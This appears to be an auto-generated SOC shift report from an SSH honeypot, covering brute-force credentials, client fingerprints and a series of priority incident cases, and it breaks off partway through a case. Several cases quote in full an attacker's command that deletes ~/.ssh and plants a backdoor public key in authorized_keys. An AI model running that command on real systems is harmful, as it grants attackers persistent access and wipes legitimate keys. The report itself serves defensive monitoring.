# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-28 |
| **Generated At** | 2026-04-28T06:33:48Z |
| **Shift Time** | 06:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **335** |
| Confirmed Threats | **277** |
| False Positives Filtered | **58** (17.3%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **9** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **317** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **61** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **33** |
| Unique Passwords | **47** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `GET / HTTP/1.1` | 3 |
| `345gs5662d34` | 3 |
| `hadoop` | 2 |
| `oracle` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 7 |
| `Accept-Encoding: gzip` | 3 |
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `Host: 13.235.92.17:23` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |
| `*1` | `$4` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `toor` | `113.141.70.64` | 2026-04-28T03:48:42 |
| `root` | `rootroot` | `113.141.70.64` | 2026-04-28T03:49:00 |
| `root` | `qwerty` | `113.141.70.64` | 2026-04-28T03:49:07 |
| `root` | `QQ123456` | `113.141.70.64` | 2026-04-28T03:49:07 |
| `root` | `root@123` | `113.141.70.64` | 2026-04-28T03:49:11 |
| `root` | `111111` | `113.141.70.64` | 2026-04-28T03:49:18 |
| `root` | `1q2w3e4r` | `113.141.70.64` | 2026-04-28T03:49:20 |
| `root` | `Ac123456` | `113.141.70.64` | 2026-04-28T03:49:28 |
| `root` | `123456789` | `113.141.70.64` | 2026-04-28T03:49:38 |
| `root` | `aB123456` | `113.141.70.64` | 2026-04-28T03:49:46 |
| `root` | `1qaz@WSX` | `113.141.70.64` | 2026-04-28T03:49:48 |
| `root` | `i-0f00f0e4433858245` | `158.180.79.132` | 2026-04-28T04:21:08 |
| `root` | `3245gs5662d34` | `158.180.79.132` | 2026-04-28T04:21:30 |
| `root` | `Admin888.` | `186.10.86.130` | 2026-04-28T05:13:50 |
| `root` | `3245gs5662d34` | `186.10.86.130` | 2026-04-28T05:13:58 |
| `root` | `qwe000` | `205.254.166.18` | 2026-04-28T05:29:14 |
| `root` | `3245gs5662d34` | `205.254.166.18` | 2026-04-28T05:29:16 |
| `root` | `` | `31.56.209.39` | 2026-04-28T06:10:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **335** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 203 |
| libssh | 11 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 40 | 1 |
| `af8223ac9914...` | libssh-based | 9 | 3 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |
| `dde267e50f82...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `95420f9d932d...` | Go SSH scanner | 159 | 1 | — |
| `0a07365cc01f...` | Go SSH scanner | 40 | 1 | Generic scanner |
| `af8223ac9914...` | libssh | 9 | 3 | libssh-based |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `b4b8ae3d7241...` | libssh | 1 | 1 | Mirai/variant |
| `c118de82e19e...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `205.254.166.18`, `186.10.86.130`, `158.180.79.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **13** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 5 | HIGH |
| `AS265379` | JULIO CESAR DAS NEVES - ME | 4 | MEDIUM |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | LOW |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS133982` | Excitel Broadband Private Limited | 1 | HIGH |
| `AS27651` | ENTEL CHILE S.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e41624fdd97a

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:47 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 113s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:47:56` | `cowrie.session.connect` |
| `2026-04-28 03:47:56` | `cowrie.client.version` |
| `2026-04-28 03:49:48` | `cowrie.client.kex` |
| `2026-04-28 03:49:48` | `cowrie.login.success` |
| `2026-04-28 03:49:49` | `cowrie.session.params` |
| `2026-04-28 03:49:49` | `cowrie.command.input` |
| `2026-04-28 03:49:49` | `cowrie.log.closed` |
| `2026-04-28 03:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51afac83e926

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 104s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:02` | `cowrie.session.connect` |
| `2026-04-28 03:48:02` | `cowrie.client.version` |
| `2026-04-28 03:49:46` | `cowrie.client.kex` |
| `2026-04-28 03:49:46` | `cowrie.login.success` |
| `2026-04-28 03:49:46` | `cowrie.session.params` |
| `2026-04-28 03:49:46` | `cowrie.command.input` |
| `2026-04-28 03:49:47` | `cowrie.log.closed` |
| `2026-04-28 03:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d999fea0e12

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 59s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:08` | `cowrie.session.connect` |
| `2026-04-28 03:48:08` | `cowrie.client.version` |
| `2026-04-28 03:49:07` | `cowrie.client.kex` |
| `2026-04-28 03:49:07` | `cowrie.login.success` |
| `2026-04-28 03:49:08` | `cowrie.session.params` |
| `2026-04-28 03:49:08` | `cowrie.command.input` |
| `2026-04-28 03:49:08` | `cowrie.log.closed` |
| `2026-04-28 03:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e524065944e

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:48 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:12` | `cowrie.session.connect` |
| `2026-04-28 03:48:41` | `cowrie.client.version` |
| `2026-04-28 03:48:41` | `cowrie.client.kex` |
| `2026-04-28 03:48:42` | `cowrie.login.success` |
| `2026-04-28 03:48:42` | `cowrie.session.params` |
| `2026-04-28 03:48:42` | `cowrie.command.input` |
| `2026-04-28 03:48:42` | `cowrie.log.closed` |
| `2026-04-28 03:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2360a6535ee2

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:12` | `cowrie.session.connect` |
| `2026-04-28 03:48:13` | `cowrie.client.version` |
| `2026-04-28 03:49:07` | `cowrie.client.kex` |
| `2026-04-28 03:49:07` | `cowrie.login.success` |
| `2026-04-28 03:49:08` | `cowrie.session.params` |
| `2026-04-28 03:49:08` | `cowrie.command.input` |
| `2026-04-28 03:49:08` | `cowrie.log.closed` |
| `2026-04-28 03:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dc29435044d

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:14` | `cowrie.session.connect` |
| `2026-04-28 03:48:14` | `cowrie.client.version` |
| `2026-04-28 03:49:19` | `cowrie.client.kex` |
| `2026-04-28 03:49:20` | `cowrie.login.success` |
| `2026-04-28 03:49:20` | `cowrie.session.params` |
| `2026-04-28 03:49:20` | `cowrie.command.input` |
| `2026-04-28 03:49:20` | `cowrie.log.closed` |
| `2026-04-28 03:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87891f9a98aa

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:15` | `cowrie.session.connect` |
| `2026-04-28 03:48:15` | `cowrie.client.version` |
| `2026-04-28 03:49:17` | `cowrie.client.kex` |
| `2026-04-28 03:49:18` | `cowrie.login.success` |
| `2026-04-28 03:49:18` | `cowrie.session.params` |
| `2026-04-28 03:49:18` | `cowrie.command.input` |
| `2026-04-28 03:49:18` | `cowrie.log.closed` |
| `2026-04-28 03:49:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec7451a75216

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:15` | `cowrie.session.connect` |
| `2026-04-28 03:48:15` | `cowrie.client.version` |
| `2026-04-28 03:49:11` | `cowrie.client.kex` |
| `2026-04-28 03:49:11` | `cowrie.login.success` |
| `2026-04-28 03:49:12` | `cowrie.session.params` |
| `2026-04-28 03:49:12` | `cowrie.command.input` |
| `2026-04-28 03:49:12` | `cowrie.log.closed` |
| `2026-04-28 03:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-342fa4a33edc

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:25` | `cowrie.session.connect` |
| `2026-04-28 03:48:25` | `cowrie.client.version` |
| `2026-04-28 03:49:27` | `cowrie.client.kex` |
| `2026-04-28 03:49:28` | `cowrie.login.success` |
| `2026-04-28 03:49:28` | `cowrie.session.params` |
| `2026-04-28 03:49:28` | `cowrie.command.input` |
| `2026-04-28 03:49:28` | `cowrie.log.closed` |
| `2026-04-28 03:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a5a44bd8cd

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:27` | `cowrie.session.connect` |
| `2026-04-28 03:48:27` | `cowrie.client.version` |
| `2026-04-28 03:49:38` | `cowrie.client.kex` |
| `2026-04-28 03:49:38` | `cowrie.login.success` |
| `2026-04-28 03:49:39` | `cowrie.session.params` |
| `2026-04-28 03:49:39` | `cowrie.command.input` |
| `2026-04-28 03:49:39` | `cowrie.log.closed` |
| `2026-04-28 03:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f72f1d94b7

| Field | Detail |
|---|---|
| **Source IP** | `113.141.70[.]64` |
| **First Seen** | 2026-04-28 03:48 |
| **Last Seen** | 2026-04-28 03:49 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 03:48:28` | `cowrie.session.connect` |
| `2026-04-28 03:48:28` | `cowrie.client.version` |
| `2026-04-28 03:48:59` | `cowrie.client.kex` |
| `2026-04-28 03:49:00` | `cowrie.login.success` |
| `2026-04-28 03:49:00` | `cowrie.session.params` |
| `2026-04-28 03:49:00` | `cowrie.command.input` |
| `2026-04-28 03:49:00` | `cowrie.log.closed` |
| `2026-04-28 03:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.70[.]64` to AbuseIPDB if not already reported
- [ ] Block `113.141.70[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9973078e7c6

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-28 04:21 |
| **Last Seen** | 2026-04-28 04:21 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 04:21:03` | `cowrie.session.connect` |
| `2026-04-28 04:21:04` | `cowrie.client.version` |
| `2026-04-28 04:21:04` | `cowrie.client.kex` |
| `2026-04-28 04:21:08` | `cowrie.login.success` |
| `2026-04-28 04:21:11` | `cowrie.session.params` |
| `2026-04-28 04:21:11` | `cowrie.command.input` |
| `2026-04-28 04:21:11` | `cowrie.command.failed` |
| `2026-04-28 04:21:12` | `cowrie.log.closed` |
| `2026-04-28 04:21:13` | `cowrie.session.params` |
| `2026-04-28 04:21:13` | `cowrie.command.input` |
| `2026-04-28 04:21:16` | `cowrie.session.file_download` |
| `2026-04-28 04:21:16` | `cowrie.log.closed` |
| `2026-04-28 04:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6995a2ca4e93

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-28 04:21 |
| **Last Seen** | 2026-04-28 04:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 04:21:25` | `cowrie.session.connect` |
| `2026-04-28 04:21:26` | `cowrie.client.version` |
| `2026-04-28 04:21:26` | `cowrie.client.kex` |
| `2026-04-28 04:21:30` | `cowrie.login.success` |
| `2026-04-28 04:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-830dfb63840d

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-04-28 05:13 |
| **Last Seen** | 2026-04-28 05:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 05:13:49` | `cowrie.session.connect` |
| `2026-04-28 05:13:49` | `cowrie.client.version` |
| `2026-04-28 05:13:49` | `cowrie.client.kex` |
| `2026-04-28 05:13:50` | `cowrie.login.success` |
| `2026-04-28 05:13:51` | `cowrie.session.params` |
| `2026-04-28 05:13:51` | `cowrie.command.input` |
| `2026-04-28 05:13:51` | `cowrie.command.failed` |
| `2026-04-28 05:13:52` | `cowrie.log.closed` |
| `2026-04-28 05:13:52` | `cowrie.session.params` |
| `2026-04-28 05:13:52` | `cowrie.command.input` |
| `2026-04-28 05:13:53` | `cowrie.session.file_download` |
| `2026-04-28 05:13:53` | `cowrie.log.closed` |
| `2026-04-28 05:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76e5539d7ae5

| Field | Detail |
|---|---|
| **Source IP** | `186.10.86[.]130` |
| **First Seen** | 2026-04-28 05:13 |
| **Last Seen** | 2026-04-28 05:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 05:13:56` | `cowrie.session.connect` |
| `2026-04-28 05:13:56` | `cowrie.client.version` |
| `2026-04-28 05:13:57` | `cowrie.client.kex` |
| `2026-04-28 05:13:58` | `cowrie.login.success` |
| `2026-04-28 05:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.10.86[.]130` to AbuseIPDB if not already reported
- [ ] Block `186.10.86[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b788537cc685

| Field | Detail |
|---|---|
| **Source IP** | `205.254.166[.]18` |
| **First Seen** | 2026-04-28 05:29 |
| **Last Seen** | 2026-04-28 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 05:29:14` | `cowrie.session.connect` |
| `2026-04-28 05:29:14` | `cowrie.client.version` |
| `2026-04-28 05:29:14` | `cowrie.client.kex` |
| `2026-04-28 05:29:14` | `cowrie.login.success` |
| `2026-04-28 05:29:14` | `cowrie.session.params` |
| `2026-04-28 05:29:14` | `cowrie.command.input` |
| `2026-04-28 05:29:14` | `cowrie.command.failed` |
| `2026-04-28 05:29:14` | `cowrie.log.closed` |
| `2026-04-28 05:29:14` | `cowrie.session.params` |
| `2026-04-28 05:29:14` | `cowrie.command.input` |
| `2026-04-28 05:29:14` | `cowrie.session.file_download` |
| `2026-04-28 05:29:14` | `cowrie.log.closed` |
| `2026-04-28 05:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.254.166[.]18` to AbuseIPDB if not already reported
- [ ] Block `205.254.166[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e61beaa9996

| Field | Detail |
|---|---|
| **Source IP** | `205.254.166[.]18` |
| **First Seen** | 2026-04-28 05:29 |
| **Last Seen** | 2026-04-28 05:29 |
| **Session Duration** | 0s |
